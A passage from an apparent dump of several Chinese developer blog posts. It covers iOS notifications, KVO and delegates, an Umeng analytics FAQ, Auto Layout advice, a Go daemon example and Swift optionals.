<p>如图所示，在通知机制中对某个通知感兴趣的所有对象都可以成为接受者。首先，这些对象需要向通知中心（NSNotificationCenter）发出addObserver:selector:name:object:消息进行注册，在投送对象投送通知送给通知中心时，通知中心就会把通知广播给注册过的接受者。所有的接受者不知道通知是谁投送的，不去关心它的细节。投送对象和接受者是一对多的关系。接受者如果对通知不再关注，会给通知中心发送removeObserver:name:Object:消息解除注册，以后不再接受通知。<br>
（ps:这段话内容摘抄自关东升先生的文章）</p>

<p>OK，我们试着去使用一下通知机制：</p>

<p>新建一个Single view Project,对项目中的文件做以下修改：</p>

<p>AppDelegate.m</p>

<pre><code>- (void)applicationDidEnterBackground:(UIApplication *)application {
    [[NSNotificationCenter defaultCenter]postNotificationName:@""APPTerminate"" object:self];
}
</code></pre>

<p>ViewController.m</p>

<pre><code>//
//  ViewController.m
//  TestNotification
//
//  Created by liwenqian on 14-10-18.
//  Copyright (c) 2014年 liwenqian. All rights reserved.
//

#import ""ViewController.h""

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    //注意此处的selector有参数，要加冒号
    [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(doSomething:) name:@""APPTerminate"" object:nil];
    // Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    [[NSNotificationCenter defaultCenter]removeObserver:self];
    // Dispose of any resources that can be recreated.
}

#pragma mark -处理通知
-(void)doSomething:(NSNotification*)notification{
    NSLog(@""收到通知"");
}

@end
</code></pre>

<p>如上所示，对模版项目的两个文件的方法或整个文件做出修改，Command+R运行你的APP，再按下Home键（Command+H），会发现打印出一行收到通知的文字，如下：<br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/shoudaonitification.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span><br>
在APP退到后台时，发出广播，而viewController因为时观察者，收到广播，执行doSomething方法，打印出收到广播的文字。</p>

<h3>KVO(Key-Value-Observing)机制</h3>

<p>原理图如下：<br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/KVO.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>如图所示：<br>
该机制下观察者的注册是在被观察者的内部进行的，不同于通知机制（由观察者自己注册），需要被观察者和观察者同时实现一个协议：<strong>NSKeyValueObserving</strong>，被观察者通过addObserver:forKeypath:options:context方法注册观察者，以及要被观察的属性。</p>

<p>新建一个single view project，同时新建一个继承自NSObject的TestWatche类：文件结构如下图：<br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/KVO-class.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>对文件进行如下修改：<br>
AppDelegate.h</p>

<pre><code>//
//  AppDelegate.h
//  TestNotification
//
//  Created by liwenqian on 14-10-18.
//  Copyright (c) 2014年 liwenqian. All rights reserved.
//

#import &lt;UIKit/UIKit.h&gt;
#import &lt;CoreData/CoreData.h&gt;
#import ""TestWatche.h""

@interface AppDelegate : UIResponder &lt;UIApplicationDelegate&gt;

@property (strong, nonatomic) UIWindow *window;

@property (readonly, strong, nonatomic) NSManagedObjectContext *managedObjectContext;
@property (readonly, strong, nonatomic) NSManagedObjectModel *managedObjectModel;
@property (readonly, strong, nonatomic) NSPersistentStoreCoordinator *persistentStoreCoordinator;
@property (strong,nonatomic) NSString *state;
@property (strong,nonatomic) TestWatche *watcher;


- (void)saveContext;
- (NSURL *)applicationDocumentsDirectory;


@end
</code></pre>

<p>AppDelegate.m 对如下方法做出修改</p>

<pre><code>- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.

    self.watcher = [TestWatche alloc];

    [self addObserver:self.watcher forKeyPath:@""state"" options:NSKeyValueObservingOptionOld | NSKeyValueObservingOptionNew context:@""pass content""];
    self.state = @""launch"";
    return YES;
}

- (void)applicationDidEnterBackground:(UIApplication *)application {
    self.state = @""backgroud"";
}
</code></pre>

<p>TestWatche.m（由于继承自NSObject,而NSObject已实现了NSKeyValueObserving协议，所以不需要做声明）</p>

<pre><code>//
//  TestWatche.m
//  TestNotification
//
//  Created by liwenqian on 14-10-18.
//  Copyright (c) 2014年 liwenqian. All rights reserved.
//

#import ""TestWatche.h""

@implementation TestWatche

-(void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context{
    NSLog(@""state change:%@"",change);
}
@end
</code></pre>

<p>OK，Command+B  Command+R Command+H看看你的应用输出了什么，如果你的操作无误的话，会显示如下内容：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/KVO-result.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h2>委托模式</h2>

<p>个人认为委托模式大多数人解释的复杂了，其实就像是java中的接口，类可以实现或不实现协议（接口）中的方法。通过此种方式，达到最大的解耦目的，方便项目的扩展。不过你需要设置应用的委托对象，以确定协议中的方法为谁服务。</p>

<p>拿最常用的UITableViewDelegate UITableViewDataSource来举例：</p>

<p>实现一个页面有一个UItableView，UItableView的每一栏（cell）的数据由我们指定，那么我们该如何做呢？苹果也自然想到了这一点，于是定义了一个接口，这个接口有许多的方法，只需要我们把要服务的对象传进去，就可以使用这些方法了，这个接口就是委托和协议。而UITableViewDelegate 和 UITableViewDataSource 就是专为UITableView而写的委托和协议。用法如下：</p>

<p>ViewController.h</p>

<pre><code>//
//  ViewController.h
//  RecipeBookMe
//
//  Created by liwenqian on 14-9-10.
//  Copyright (c) 2014年 liwenqian. All rights reserved.
//

#import &lt;UIKit/UIKit.h&gt;

@interface ViewController : UIViewController &lt;UITableViewDelegate, UITableViewDataSource&gt;

@property (nonatomic, strong) IBOutlet UITableView *mytableView;

@end
</code></pre>

<p>ViewController.m</p>

<pre><code>//
//  ViewController.m
//  RecipeBookMe
//
//  Created by liwenqian on 14-9-10.
//  Copyright (c) 2014年 liwenqian. All rights reserved.
//

#import ""ViewController.h""
#import ""DetailViewController.h""
#import ""Recipe.h""
#import ""RecipeTableCellTableViewCell.h""

@interface ViewController ()

@end

@implementation ViewController{
     NSArray *recipes;      
}

@synthesize mytableView;

- (void)viewDidLoad {
    [super viewDidLoad];

    // Initialize the recipes array
    Recipe *recipe1 = [Recipe new];

    recipe1.name = @""Egg Benedict"";
    recipe1.prepTime = @""30 min"";
    recipe1.image = @""egg_benedict.jpg"";
    recipe1.ingredients = [NSArray arrayWithObjects:@""2 fresh English muffins"", @""4 eggs"", @""4 rashers of back bacon"", @""2 egg yolks"", @""1 tbsp of lemon juice"", @""125 g of butter"", @""salt and pepper"", nil];

    Recipe *recipe2 = [Recipe new];
    recipe2.name = @""Mushroom Risotto"";
    recipe2.prepTime = @""30 min"";
    recipe2.image = @""mushroom_risotto.jpg"";
    recipe2.ingredients = [NSArray arrayWithObjects:@""1 tbsp dried porcini mushrooms"", @""2 tbsp olive oil"", @""1 onion, chopped"", @""2 garlic cloves"", @""350g/12oz arborio rice"", @""1.2 litres/2 pints hot vegetable stock"", @""salt and pepper"", @""25g/1oz butter"", nil]; 

    recipes = [NSArray arrayWithObjects:recipe1, recipe2, nil];

}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
}

/*--------------------------------------------------------------------*/
//定义UITableview的栏目数量
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
     return [recipes count];
}

//定义UITableviewCell的显示内容
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CoustomerTableIdentifier = @""RecipeTableCellTableViewCell"";

    RecipeTableCellTableViewCell *cell =(RecipeTableCellTableViewCell *) [tableView dequeueReusableCellWithIdentifier:CoustomerTableIdentifier];

    if (cell == nil) {
       cell = [[RecipeTableCellTableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CoustomerTableIdentifier];
    }

    recipe = [recipes objectAtIndex:indexPath.row];

    cell.nameLabel.text =  recipe.name;
    cell.prepTimeLabel.text= recipe.prepTime;
    cell.thumbnailImageView.image = [UIImage imageNamed:recipe.image];

    return cell;
}

//点击每一栏执行跳转时的处理
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    if ([segue.identifier isEqualToString:@""showRecipeDetail""]) {

        NSIndexPath *indexPath = nil;
        Recipe *recipe = nil;

        indexPath = [self.mytableView indexPathForSelectedRow];
        recipe = [recipes objectAtIndex:indexPath.row];

        DetailViewController *destViewController = segue.destinationViewController;
        destViewController.recipe = [recipes objectAtIndex:indexPath.row];
    }
}

//定义cell的高度
- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    return 71;
}
/*--------------------------------------------------------------------*/
@end
</code></pre>

<p>如上所示，两条/<em>------</em>/注释间的方法全部来自于委托和协议。利用委托和协议，你可以把主要精力放到逻辑业务上，将数据绑定和事件处理交给委托和协议去完成。</p>

<h1>完</h1>

                ", iOS开发——设计模式那点事,1531972168,155,1,428,1,1,https://segmentfault.com/a/1190000000768605
183,1,0,6,"
                    
<p>友盟统计使用流程<br><a rel=""nofollow"" href=""http://bbs.umeng.com/thread-55-1-1.html"">http://bbs.umeng.com/thread-55-1-1.html</a></p>

<p><strong>常见的疑难杂症汇总如下：</strong></p>

<p><strong>1、appkey、channel与version（版本）常见问题</strong></p>

<p>友盟统计认为，appkey是每个应用的唯一标识，同一应用的不同平台请使用不同appkey，建议您在友盟后台命名为“应用名-平台（友盟统计客户端-Android）”；channel是指您发布的市场和推广渠道标识，android平台上，如代码中没有填写则记为“unknown”，IOS平台中，如代码中没有填写则记为“Appstore”，由于Appstore的特殊性，如需统计推到推广效果可以使用umtrack（www.umtrack.com）<br>
每个appkey在每台设备上只记录初始安装渠道，不会因为通过其他渠道升级或重新安装而改变；<br>
version是每个应用的版本号，友盟SDK以VersionName作为应用程序的版本标识。详情<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5413-1-1.html"">http://bbs.umeng.com/thread-5413-1-1.html</a></p>

<p><strong>2、页面的统计常见问题</strong><br>
Android平台：您必须按照文档集成页面统计的代码，否则SDK无法正常统计；注意，如果您的Activity之间有继承或者控制关系请不要同时在父和子Activity中重复添加onPause和onResume方法，否则会造成启动次数异常。(eg.使用TabHost、TabActivity、ActivityGroup时)。详情：<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5414-1-1.html"">http://bbs.umeng.com/thread-5414-1-1.html</a></p>

<p><strong>3、view的统计常见问题</strong><br>
由于view都是开发者自己定义的，所以无法确切描述怎么集成，只能说，view 显示的调用 onPageStart, view 隐藏的时候调用 onPageEnd，而且要保证,这两个方法的调用不交叉。详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5415-1-1.html"">http://bbs.umeng.com/thread-5415-1-1.html</a></p>

<p><strong>4、发送策略常见问题</strong><br>
友盟默认的发送策略为“启动时发送”并且提供间隔发送，可通过后台【设置】-【发送策略】更改，请注意，当使用间隔发送时，应用的启动数据仍会在启动时发送，页面访问、自定义事件等数据会按照设定的间隔时间发送，如果本次启动时长不足设定间隔，下次启动继续累积。详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5416-1-1.html"">http://bbs.umeng.com/thread-5416-1-1.html</a></p>

<p><strong>5、自定义事件常见问题</strong><br>
友盟自定义事件在使用前需要到【设置-&gt;事件】页面添加对应的eventid（不要使用中文和特殊字符且不能使用英文句号“.”您可以使用下划线“_”），同时自定义事件的代码需要写在onResume--onPause之间（高两部分针对Android而言），不支持在service中统计。<br>
每个应用至多有500的自定义事件，每个事件的参数不能超过10个，每个参数不能有超过1000个取值，请合理分类。具体的集成方法请参考集成文档，详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5417-1-1.html"">http://bbs.umeng.com/thread-5417-1-1.html</a></p>

<p><strong>6、错误统计常见问题</strong><br>
Android：<br>
开发者自己使用UncaughtExceptionHandler在程序中添加了全局的异常捕捉时，如果是开发者的先注册友盟的后注册，友盟不会覆盖开发者的，但是如果友盟先注册，开发者注册的可能会覆盖友盟的。如果您不需要错误统计，可以通过MobclickAgent.setCatchUncaughtExceptions(false);关闭，如果开发者需要自己上传错误，友盟也提供相应的方法：public static void reportError(Context context, String error) //或public static void reportError(Context context, Throwable e)。<br><strong>IOS：</strong><br>
UmengSignalHandler 不是错误，是捕捉crash的方法，本身不引起crash， 当crash发生时由它来捕捉。如果您不需要使用错误统计，可以通过[MobClick setCrashReportEnabled:NO];关闭。<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5418-1-1.html"">http://bbs.umeng.com/thread-5418-1-1.html</a></p>

<p><strong>7、集成后没有数据问题</strong><br>
首先，请确定您是否使用了“集成测试”，为了防止测试数据污染正式数据报表，友盟提供测试模式——集成测试，集成测试模式下，测试设备的数据直接进入“实时日志”并格式化显示，测试数据不会进入正是报表。<br>
请注意，自定义事件等数据默认下次启动发送，请您触发事件后关闭应用超过30s后再次启动打印log日志【请先在程序入口添加以下代码打开调试模式：MobclickAgent.setDebugMode( true );】，查看是否有“event”字段（错误统计测试的方法相同，请关注error字段）<br>
页面统计是抽样数据，抽样比为日志的3%，如需测试页面数据，请使用集成测试模式（<a rel=""nofollow"" href=""http://www.umeng.com/test_devices"">http://www.umeng.com/test_devices</a>）详情<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5419-1-1.html"">http://bbs.umeng.com/thread-5419-1-1.html</a></p>

<p><strong>8、无广告app使用idfa版SDK常见问题（提交Appstore被拒绝）</strong><br>
集成文档参见&gt;&gt;<a rel=""nofollow"" href=""http://dev.umeng.com/analytics/ios/advanced-integration-guide#5"">http://dev.umeng.com/analytics/ios/advanced-integration-guide#5</a><br>
请自行调用UIWebView来展示：+ (NSString *)[MobClick getAdURL];，集成后请注册测试设备使用集成测试模式，使用测试设备触发广告页面后，在友盟后台【管理-&gt;应用管理-&gt;内置广告开关】可以看到对应的广告开关，应用成功发布到Appstore之后，在后台关闭广告即可。<br>
更多详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5420-1-1.html"">http://bbs.umeng.com/thread-5420-1-1.html</a></p>

<p><strong>9、友盟统计 SDK 混淆后为什么不能统计的？</strong><br>
涉及代码太多，请点击说明文档<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5446-1-1.html"">http://bbs.umeng.com/thread-5446-1-1.html</a></p>

<p><strong>10、为什么友盟的页面统计比我们自己后台统计的少？</strong><br>
Android平台：您必须按照文档集成页面统计的代码，否则SDK无法正常统计；注意，如果您的Activity之间有继承或者控制关系请不要同时在父和子Activity中重复添加onPause和onResume方法，否则会造成启动次数异常。(eg.使用TabHost、TabActivity、ActivityGroup时)。<br>
（Android &amp; IOS）请注意，页面统计是抽样数据，抽样比为日志的3%，如需测试页面数据，请使用集成测试模式（<a rel=""nofollow"" href=""http://www.umeng.com/test_devices"">http://www.umeng.com/test_devices</a>）<br>
android页面的集成方法请您参考集成文档&gt;&gt;<a rel=""nofollow"" href=""http://dev.umeng.com/analytics/android/quick-start#2.3"">http://dev.umeng.com/analytics/android/quick-start#2.3</a><br>
IOS页面集成文档&gt;&gt;<a rel=""nofollow"" href=""http://dev.umeng.com/analytics/ios/quick-start#2.2"">http://dev.umeng.com/analytics/ios/quick-start#2.2</a><br>
更多详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5414-1-1.html"">http://bbs.umeng.com/thread-5414-1-1.html</a></p>

<p><strong>11、友盟iOS统计中破解和越狱是什么？（友盟怎么识别破解和越狱？）</strong></p>

<p>1)先来解释下什么是越狱及破解呢？<br>
所谓越狱，是用于获取苹果公司移动设备操作系统iOS最高权限（ROOT）的一种技术手段。越狱完成后设备依然运行iOS操作系统，一款名为Cydia的软件（或其他越狱软件）将会被安装在设备中，通过此软件可以完成越狱前不可能进行的动作，例如安装App Store以外的软件、更换外观主题、运行Shell程序、甚至可能解开营运商对手机网络的限制。<br>
所谓破解，是指正版应用或游戏通过去除苹果的加密保护，从而能够在越狱设备之间任意分发并安装。<br>
2)友盟是如何识别越狱设备及破解app的？<br>
越狱设备是通过安装越狱软件来进行越狱的，所以识别越狱设备是通过检测apt和Cydia.app的path来判断的。如果安装了apt或者Cydia则被认为该设备已越狱。<br>
破解app是通过去掉苹果的加密文件达成的，破解后app的结构会与正版app有多处不同，通过识别这些结构的改变来判断app是否破解。<br>
3)越狱及破解的识别错误及误差来自哪里？<br>
越狱的误差来自于第三方的小越狱工具，（未安装cydia、apt或路经不是常见的 /Applications/Cydia.app, /private/var/lib/apt/），会有未统计到的情况，误差在5%左右<br>
破解的误差可能出现在开发过程中，debug模式下会被误判为破解的app，但app上线后由此产生的误差会很小。<br>
详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5495-1-1.html"">http://bbs.umeng.com/thread-5495-1-1.html</a></p>

<p><strong>12、为什么友盟统计到的渠道新增用户比市场统计的少（多）？</strong><br>
由于统计原理不同，渠道市场通常统计的是下载量，而友盟在用户联网启动之后才能统计到，所以友盟的渠道新增用户，通常是少于渠道给出的下载量的<br>
不过由于安卓市场昏乱，不排除有小渠道抓包发布，会造成友盟统计渠道新增用户少于市场数据。详情点击<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5507-1-1.html"">http://bbs.umeng.com/thread-5507-1-1.html</a><br>
13常见问题：时长分布的启动次数之和不等于总启动次数<br>
详情<a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5940-1-1.html"">http://bbs.umeng.com/thread-5940-1-1.html</a></p>

<p>iOS问题<br>
1、无广告app使用idfa版SDK常见问题（提交Appstore被拒绝）<br><a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5420-1-1.html"">http://bbs.umeng.com/thread-5420-1-1.html</a><br>
2、友盟iOS统计中破解和越狱是什么？（友盟怎么识别破解和越狱？）<br><a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5495-1-1.html"">http://bbs.umeng.com/thread-5495-1-1.html</a><br>
3、使用友盟SDK提交Appstore审核被拒的常见解决方法<br><a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5692-1-1.html"">http://bbs.umeng.com/thread-5692-1-1.html</a><br>
4、使用友盟SDK提交Appstore审核被拒的常见解决方法</p>

<p>Android问题<br>
1、友盟统计sdk混淆后为什么不能统计的？<br><a rel=""nofollow"" href=""http://bbs.umeng.com/thread-5446-1-1.html"">http://bbs.umeng.com/thread-5446-1-1.html</a></p>

                ", 使用友盟统计分析常见问题100篇（索引-持续更新）,1531972170,479,1,292,1,1,https://segmentfault.com/a/1190000000682209
184,1,0,6,"
                    
<p>这篇不是autolayout教程，只是autolayout动员文章和经验之谈，在本文第五节友情链接和推荐中，我将附上足够大家熟练使用autolayout的教程。这篇文章两个月前就想写下来，但因为一直工作较多，没有时间来完成。今天终于狠下心，丢下代码不写，来完成他吧！</p>

<h1>一、别和我提Autolayout，我想死！！</h1>

<p>从iOS6/xcode4开始，苹果开始提供了autolayout——一种对不同屏幕尺寸有更好兼容的自动布局机制，但我相信大多数人在刚接触autolayout时，一定和我一样，几乎快被其折磨致死！</p>

<p>autolayout因为布局思路与传统frame有所不同，国内关于autolayout的教程有过少，且autolayout在刚上手时灵活性不易掌控，导致大家更多选择了放弃。</p>

<h1>二、为啥我要用autolayout？</h1>

<p>随着3.5寸/4寸iPhone在市面同时使用越来越多，以及即将上市的iPhone6、iPhone6 Plus，不同尺寸、不同分辨率的iOS设备将会越来越多，使用传统frame布局的工作量必将越来越大；加上苹果发出的信号，使用autolayout势在必行。</p>

<p>好了，我该来表扬表扬autolayout了，它到底能解决什么问题，给我们带来哪些好处？<br><strong>1）你基本上可以不用考虑3.5寸和4寸以及即将上市的x.x寸屏幕不同分辨率的问题，你终于可以不用在viewDidLoad方法里判断不同分辨率下，不同控件应该放在哪里，或者针对不同分辨率写不同的storyboard和xib；<br>
2）你可以抛弃那些根据不同文字来计算tableViewCell、UILabel高度的代码了，因为autolayout会帮你自动计算好；<br>
3）如果你的布局在横屏竖屏下变化不是特别大，你不用再为横着竖着写两套代码或者写两个storyboard/xib了；<br>
4）对于即将上市的4.7寸和5.5寸iPhone，你基本上能很快甚至不用动一行代码就完成他们的自适应屏幕布局，不用每次来了新分辨率，你只能say f*ck，然后改两个通宵。</strong><br>
再看看苹果的态度，默认就是选择了使用autolayout。虽然我现在仍有时会骂autolayout，但我还是会坚决地选择走上这条道路。</p>

<h1>三、Autolayout之折腾二三事</h1>

<p>刚刚表扬完autolayout，那我得为和我一样，愿意选择走上这条道的同志们提点醒了，你究竟要做好哪些折腾的准备。</p>

<h2>3.1.布局思维的转变</h2>

<p>传统布局思路中，一个view在哪里有多大，那就写清楚它的坐标位置和宽高就定了，平时用CGRect和CGPoint这两种模型就足够了，而且它一定非常听你的话，写的是多少，它绝对就是多少；但是autolayout的思路却变化了，或者说改进了，它囊括了传统frame布局思路，除了可以告诉view的坐标和宽高，它更提供了一种相对的概念，比如：<br>
1）view相对于屏幕视图左边5点，右边10点，上面15点，下面20点，如果屏幕的长宽比例发生了改变（比如从3.5寸的320:480变成了4寸的320:568，或者从横屏切换到了竖屏），view仍然会随着屏幕的比例而拉伸改变，仍然保持离屏幕视图左边5点，右边10点，上面15点，下面20点；<br>
2）view1和view2之间相距10点，当屏幕尺寸发生改变或者旋转时，他俩仍然可以通过改变自身的尺寸或位置改变来保证它们中间就是相距10点；<br>
3）...<br>
所以，使用autolayout的第一步是你需要考虑它相对于superView或者brotherView的上下左右的距离，改变自己布局的思维。</p>

<h2>3.2.使用autolayout可能会经常得到自己不想看到的样子，而且你改变frame还没用</h2>

<p>frame时代，是你写的多少位置点就是多少位置点，view不会被自动的拉伸或者改变位置，但是autolayout中的view却会根据屏幕长宽比或者其他view的改变而改变，你经常就会看到被自动布局成了不是你想的样子，这也是太多人被折磨的原因。只要你考虑的相对的位置不正确，它真的就可能会乱掉。</p>

<h2>3.3.autolayout的VFL(Visual Format Language)语法初看起来真蛋疼</h2>

<p>好吧，既然使用了autolayout，使用frame来改变位置不起作用了，那我也用代码来完成autolayout总行了吧。但是，让我选一段最普通的VFL代码给你看看：</p>

<pre><code>NSString *vfl = @""V:|-5-[_view]-10-[_imageView(20)]-10-[_backBtn]-5-|"";
</code></pre>

<p>纳尼？！这是什么地干活？！我又要付出学习成本了啊！！！其实这段话就是说，在垂直方向从上到下，view离父视图5点，imageView距离view 10点，同时imageView是20点高，backBtn离imageView底部10点，距离父视图底部5点。</p>

<h2>3.4.手动Constraint书写，那个长长长啊~~</h2>

<p>当然，你还可以一个一个的写布局约束Constraint，就和frame分别指定origin和size类似，但是却像这样：</p>

<pre><code>[self.view addConstraint: [NSLayoutConstraint constraintWithItem:blueView
attribute:NSLayoutAttributeLeft
relatedBy:NSLayoutRelationEqual
toItem:redView
attribute:NSLayoutAttributeLeft
multiplier:1
constant:0]];
</code></pre>

<p>而上文中的“view离父视图5点，imageView距离view 10点，同时imageView是20点高，backBtn离imageView底部10点，距离父视图底部5点”每一个逗号短句都是像这样的一个constraint。</p>

<h1>四、你是不是已经准备放弃了？NO!说好的爱上Autolayout呢！</h1>

<p>写到这里，我忽然觉得我是在黑autolayout了，不，看我的题目，我是真的已经爱上使用autolayout了。就让我来说说应该怎么使用autolayout。</p>

<h2>4.1.autolayout一般应用步骤和最适宜场景</h2>

<p>当你的页面不会变更整体布局和设计，只有在不同屏幕尺寸、不同文字和内容下有适应性的变化，那这种情况使用autolayout就再适宜不过了。不会在像frame的时代，苦逼的要为不同屏幕尺寸计算各自的位置点坐标和大小了。通常使用xcode-&gt;Editor-&gt;Pin/Align菜单为视图添加约束即可。一般通过InterfaceBuilder确定控件位置，当存在需要自动被拉伸、适应或位移的控件时就要添加constraint；具体使用教程可参考<a rel=""nofollow"" href=""http://www.cocoachina.com/industry/20131203/7462.html"">《开始iOS 7中自动布局教程1》</a></p>

<h2>4.2.你的视图有比较简单的布局改变</h2>

<p>当需要产生比较简单动画或动态添加视图时，autolayout还算好用。通常有两种方式：<br>
1.在Controller中像声明UIView的IBOutlet一样，声明一个Constraint属性，例如XXViewTopConstraint.当进行布局变化时，直接修改XXViewTopConstraint的constant属性，即可改变其相对位置。然后再来一句</p>

<p><code>[self.view layoutIfNeeded];</code></p>

<p>搞定！<br>
2.通过Constraint的优先级（Priority）来变更视图相对布局。如过是两条同样描述距离superview上边缘距离的约束，如果这两个约束的数值不同，但是优先级一样，则autolayout将报布局冲突，将会丢弃某一条约束（这时可能就会丢弃你想要的约束，而恰恰保留了你不想看到的布局）。所以，当我们发生布局变化时，无法像frame的绝对定位，直接改变，并且只有唯一的位置信息。那么，我们该怎么处理这种布局冲突呢？那就是让描述相同但数值不同的这两个约束采用不同的优先级。autolayout默认将使用数值较大的优先级约束。</p>

<p>通常1就能搞定大部分问题，2的情况较少，但有时有奇效！</p>

<h2>4.3.你的视图有较为复杂的动画效果或者较大的布局改变</h2>

<p>虽然autolayout可以完成所有的布局问题，但它仍然在某些情况下是不方便的，就像4.2节描述的，你的每一行代码只能改变一个constraint，但要知道每个视图通常需要4个甚至更多constraint来约束，所以一旦有较为复杂的布局改变和动画，那你可能需要写好几行，但是frame一行代码就可以搞定。<br>
并且，好几行代码还不是最要命的，要命的是你可能还需要给这每一个约束声明IBOutlet，或者通过view的constraints属性，从constraints数组里判断出对应方向、大小的约束，再改值，真心好折腾！<br>
所以，当你需要非常频繁的变更控件布局，并且变更的位置是不确定的（例如通过手势拖动一个视图到屏幕任意位置），那么，我建议此视图不要使用autolayout，而使用frame的所写即所得的绝对定位方式更好，你只需要充分考虑各种屏幕适配，并为其计算适合的坐标点即可。同时，我还建议这种频繁变更的视图甚至不要InterfaceBuilder来绘制，最好直接代码书写，因为一旦你勾选了autolayout，那么storyboard中的所有视图都将autolayout。当你需要变更视图布局时，则必须使用<br><code>view.translatesAutoresizingMaskIntoConstraints = NO;</code><br><code>superview.translatesAutoresizingMaskIntoConstraints = NO;</code><br>
来避免为你的视图新增默认autolayout约束。</p>

<h1>五、友情链接和推荐</h1>

<p>1.<a rel=""nofollow"" href=""http://www.cocoachina.com/industry/20131203/7462.html"">《开始iOS 7中自动布局教程1》</a><br>
这个教程看完基本上可以比较熟悉的使用autolayout，再结合本文的一些经验，应该能够解决大部分问题了。而该文的教程2没有中文翻译，只有英文原版：<a rel=""nofollow"" href=""http://www.raywenderlich.com/50319/beginning-auto-layout-tutorial-in-ios-7-part-2"">《Beginning Auto Layout Tutorial in iOS 7: Part 2》</a><br>
2.<a rel=""nofollow"" href=""http://www.cocoachina.com/industry/20131108/7322.html"">《Autolayout及VFL经验分享》</a><br>
这篇文章以较简单的描述囊括了VFL使用方法和常用的autolayout技巧。足够大家使用了。<br>
3.<a rel=""nofollow"" href=""http://blog.csdn.net/sxfcct/article/details/8776928"">《AutoLayout（自动布局）入门》</a><br>
这篇文章精简的囊括了autolayout的代码操作方式。<br>
4.<a rel=""nofollow"" href=""http://lvwenhan.com/ios/430.html"">《Auto Layout 使用心得》</a><br>
作者JohnLui囊括了autolayout最常用的使用场景，描述清晰详细，使用swift实现，实用性超强。</p>

<p>如果在通读了本文和以上链接后还无法灵活运用autolayout，欢迎给我留言，大家一起讨论！同时欢迎关注我的博客<a rel=""nofollow"" href=""http://www.ilikewhite.com"">http://www.ilikewhite.com</a>和微博<a rel=""nofollow"" href=""http://weibo.com/ilikewhite"">http://weibo.com/ilikewhite</a></p>

                ", 从此爱上iOS Autolayout,1531972172,127,1,215,1,1,https://segmentfault.com/a/1190000000646452
185,1,0,6,"
                    
<h2>安装：</h2>

<pre><code>go get github.com/icattlecoder/godaemon
</code></pre>

<h2>示例:</h2>

<pre><code class=""lang-go"">package main

import (
    _ ""github.com/icattlecoder/godaemon""
    ""log""
    ""net/http""
)

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc(""/index"", func(rw http.ResponseWriter, req *http.Request) {
        rw.Write([]byte(""hello, golang!\n""))
    })
    log.Fatalln(http.ListenAndServe("":7070"", mux))
}
</code></pre>

<h2>运行</h2>

<pre><code>./example -d=true
~$ curl http://127.0.0.1:7070/index
hello, golang!
</code></pre>

                ", 以后台形式运行golang程序,1531972173,318,1,470,1,1,https://segmentfault.com/a/1190000000589972
186,1,0,6,"
                    
<p>一般我们在一下两种情况下会遇到！和？的使用<br>
1.声明变量时</p>

<pre><code>var number ：Int？
var str ： String！
</code></pre>

<p>2.在对变量操作时</p>

<pre><code>number?.hashValue
str!.hashValue
</code></pre>

<p>由于这两种情况的意义不同，所以分开进行解释：</p>

<p><strong>1.声明变量时</strong><br>
在声明一个变量时如果不手动初始化，Swift不会自动初始化该变量为一个默认值的。</p>

<pre><code>var a : String
var b = a           //error:因为没有初始化a，a没有值
</code></pre>

<p>但是对于Optional的变量则不同，Optional的变量在声明时如果不初始化，Swift会自动将该变量初始化为nil。声明变量时在类型后添加？或者！就是告诉编译器这个一个Optional的变量，如果没有初始化，你就将其初始化为nil</p>

<pre><code>var a : String?           //a 为nil
var b : String!           //b 为nil
var a_test = a            //a_test为nil
var b_test = b            //b_test为nil
</code></pre>

<p>但是这两者之间还是有一些区别的，介绍后面之后再讲。<br>
Optional事实上是一个枚举类型，从下图可以看出，Optional包含None和Some两种类型，而nil就是Optional.None，非nil就是Optional.some。如果Optional变量在声明时不初始化，Swift会调用init()来初始化变量为nil，而用非nil的值初始化变量时，会通过Some(T)把该原始值包装，所以在之后使用的时候我们需要通过解包取出原始值才能使用。</p>

